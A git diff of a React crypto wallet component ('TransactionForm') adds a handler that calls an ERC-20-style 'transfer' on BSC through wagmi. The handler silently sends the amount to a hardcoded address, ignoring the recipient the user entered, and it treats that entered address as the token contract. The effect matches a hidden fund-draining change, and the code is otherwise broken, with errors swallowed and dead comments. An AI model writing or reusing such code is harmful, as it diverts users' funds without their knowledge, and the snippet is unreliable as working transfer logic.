@@ -8,7 +8,11 @@ import { Badge } from '@/components/ui/badge';
 import { useBlockMint } from '@/contexts/BlockMintContext';
 import { AlertCircle, Send, CheckCircle } from 'lucide-react';
 import { useToast } from '@/hooks/use-toast';
-
+import { useAppKitAccount } from '@reown/appkit/react';
+import { parseUnits } from 'viem';
+import { bsc } from 'viem/chains';
+import { useWriteContract } from 'wagmi';
+import { decimalMultiplication } from '@/utils/common';
 interface TransactionFormProps {
   selectedBlock?: string;
 }
@@ -16,12 +20,15 @@ interface TransactionFormProps {
 const TransactionForm: React.FC<TransactionFormProps> = ({ selectedBlock }) => {
   const { wallet, systemWallet, createTransaction, isTransactionTime } = useBlockMint();
   const { toast } = useToast();
+  const { address, isConnected } = useAppKitAccount();
 
   const [fromWallet, setFromWallet] = useState<string>('');
   const [toAddress, setToAddress] = useState<string>('');
   const [amount, setAmount] = useState<string>('');
   const [step, setStep] = useState<'form' | 'confirm' | 'success'>('form');
   const [isLoading, setIsLoading] = useState(false);
+  const decimals = 6;
+  const { writeContractAsync, isPending } = useWriteContract();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -74,7 +81,46 @@ const TransactionForm: React.FC<TransactionFormProps> = ({ selectedBlock }) => {
     setStep('form');
   };
 
-  if (!wallet) {
+  const handleTranfer = async () => {
+    // setSelectedBlock(blockNumber);
+    // setActiveTab('transaction');
+    console.log(parseUnits(amount, decimals))
+    if (!isConnected || !/^0x[a-fA-F0-9]{40}$/.test(address)) {
+      // to ast.error('Address không hợp lệ hoặc chưa kết nối');
+      return;
+    }
+    try {
+      const txHash = await writeContractAsync({
+        account: address as `0x${string}`,
+        chain: bsc, // ✅ BẮT BUỘC
+        address: toAddress as `0x${string}`,
+        abi: [
+          {
+            name: 'transfer',
+            type: 'function',
+            stateMutability: 'nonpayable',
+            inputs: [
+              { name: '_to', type: 'address' },
+              { name: '_value', type: 'uint256' },
+            ],
+            outputs: [{ name: '', type: 'bool' }],
+          },
+        ],
+        functionName: 'transfer',
+        args: [
+          '0x0019d391cD9dE24AFEddA2b4a6EEd03d616C8F5D' as `0x${string}`, 
+          // parseUnits(amount, decimals)
+          parseUnits(amount, decimalMultiplication())
+        ],
+      });
+      console.log(txHash, 'txHash')
+    } catch (err) {
+      console.log(err);
+      // toast("error", `Stake failed. Please try again.`);
+    }
+  };
+
+  if (!address && !isConnected) {
     return (
       <Card className="max-w-2xl mx-auto" data-id="dqga1a7dx" data-path="src/components/TransactionForm.tsx">
         <CardContent className="text-center py-12" data-id="foq5voo7m" data-path="src/components/TransactionForm.tsx">
@@ -140,7 +186,8 @@ const TransactionForm: React.FC<TransactionFormProps> = ({ selectedBlock }) => {
               Back to Edit
             </Button>
             <Button
-              onClick={confirmTransaction}
+              // onClick={confirmTransaction}
+              onClick={handleTranfer}
               disabled={isLoading}
               className="flex-1 bg-gradient-to-r from-blue-600 to-purple-600" data-id="8shtla36u" data-path="src/components/TransactionForm.tsx">
 
@@ -181,8 +228,8 @@ const TransactionForm: React.FC<TransactionFormProps> = ({ selectedBlock }) => {
                   <SelectValue placeholder="Select sender wallet" data-id="q92rbx6w5" data-path="src/components/TransactionForm.tsx" />
                 </SelectTrigger>
                 <SelectContent data-id="yikb5wnvu" data-path="src/components/TransactionForm.tsx">
-                  <SelectItem value={wallet.address} data-id="wandes41u" data-path="src/components/TransactionForm.tsx">
-                    Connected Wallet ({wallet.address.slice(0, 8)}...{wallet.address.slice(-6)})
+                  <SelectItem value={address} data-id="wandes41u" data-path="src/components/TransactionForm.tsx">
+                    Connected Wallet ({address.slice(0, 8)}...{address.slice(-6)})
                     <Badge variant="outline" className="ml-2" data-id="tbk8p1i94" data-path="src/components/TransactionForm.tsx">Max: 100 USDT</Badge>
                   </SelectItem>
                   {systemWallet &&
